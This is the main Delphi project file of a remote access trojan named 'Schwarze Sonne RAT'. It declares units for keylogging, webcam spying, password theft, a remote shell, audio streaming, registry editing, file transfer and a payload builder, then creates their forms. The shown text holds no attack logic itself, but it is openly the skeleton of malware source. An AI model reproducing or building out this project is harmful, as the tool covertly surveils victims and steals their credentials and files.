program ProjRAT;




uses
  Forms,
  userv in 'userv.pas',
  uConn in 'uConn.pas',
  MainU in 'MainU.pas' {MainForm},
  uSettings in 'uSettings.pas' {Form1},
  uFilemanager in 'uFilemanager.pas' {Form2},
  uFlag in 'uFlag.pas',
  uTransferView in 'uTransferView.pas' {Form3},
  uScreen in 'uScreen.pas' {Form4},
  uProcess in 'uProcess.pas' {Form5},
  uCamspy in 'uCamspy.pas' {Form7},
  uAbout in 'uAbout.pas' {Form8},
  uBuild in 'uBuild.pas' {Form9},
  uKeylogger in 'uKeylogger.pas' {Form10},
  uRegistryeditor in 'uRegistryeditor.pas' {Form11},
  uScreenNor in 'uScreenNor.pas' {Form12},
  uPass in 'uPass.pas' {Form13},
  uDownload in 'uDownload.pas' {Form14},
  uPlugin in 'uPlugin.pas' {Form15},
  uProfiles in 'uProfiles.pas' {Form16},
  uManager in 'uManager.pas' {Form17},
  uInformation in 'uInformation.pas' {Form6},
  uRemoteShell in 'uRemoteShell.pas' {Form18},
  uAudioStream in 'uAudioStream.pas' {Form19},
  uNotify in 'uNotify.pas' {Form90},
  uNihal in 'uNihal.pas' {Form20},
  uMini in 'uMini.pas' {Form21},
  afxCodeHook in 'afxCodeHook.pas';

{$R *.RES}
begin
  Application.Initialize;
  Application.Title := 'Schwarze Sonne RAT';
  Application.CreateForm(TMainForm, MainForm);
  Application.CreateForm(TForm1, Form1);
  Application.CreateForm(TForm2, Form2);
  Application.CreateForm(TForm3, Form3);
  Application.CreateForm(TForm4, Form4);
  Application.CreateForm(TForm5, Form5);
  Application.CreateForm(TForm7, Form7);
  Application.CreateForm(TForm8, Form8);
  Application.CreateForm(TForm9, Form9);
  Application.CreateForm(TForm10, Form10);
  Application.CreateForm(TForm11, Form11);
  Application.CreateForm(TForm12, Form12);
  Application.CreateForm(TForm13, Form13);
  Application.CreateForm(TForm14, Form14);
  Application.CreateForm(TForm15, Form15);
  Application.CreateForm(TForm16, Form16);
  Application.CreateForm(TForm17, Form17);
  Application.CreateForm(TForm6, Form6);
  Application.CreateForm(TForm18, Form18);
  Application.CreateForm(TForm19, Form19);
  Application.CreateForm(TForm90, Form90);
  Application.CreateForm(TForm20, Form20);
  Application.CreateForm(TForm21, Form21);
  Application.Run;
end.
